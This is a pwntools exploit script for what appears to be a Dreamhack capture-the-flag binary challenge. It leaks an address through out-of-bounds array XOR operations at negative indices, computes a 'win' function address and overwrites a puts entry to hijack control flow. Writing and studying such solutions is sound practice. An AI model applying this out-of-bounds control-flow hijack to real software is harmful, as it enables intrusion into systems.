#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./main_patched', checksec=False)

ld = ELF("./ld-2.35.so")
libc = ELF("./libc.so.6", checksec=False)

gs = """
b *main
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 15385)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def xor(index1, index2):
    sl(b'1')
    sla(b'Enter i & j > ', str(index1).encode())
    sl(str(index2).encode())
    io.recvuntil(b'> ')

def print_value(index):
    sl(b'2')
    sla(b'Enter i > ', str(index))
    io.recvuntil(b'Value: ')
    value = int(io.recvline(), 16) 
    return value   

io = start()
io.recvuntil(b"> ")

#arr[1] = 525 
xor(1, 1)
xor(1, 0)
xor(1, 2)
xor(1, 3)
xor(1, 9)

xor(0, 0)
xor(0, -86)
win = print_value(0) + 0x20d
success(f"win @ {hex(win)}")

#arr[0] save the address of the win function
xor(0, 1)

# the address of the win function XOR the adress of puts
xor(0, -19)


sl(b'1')
sla(b'Enter i & j > ', str(-19).encode())
sl(str(0).encode())
io.interactive()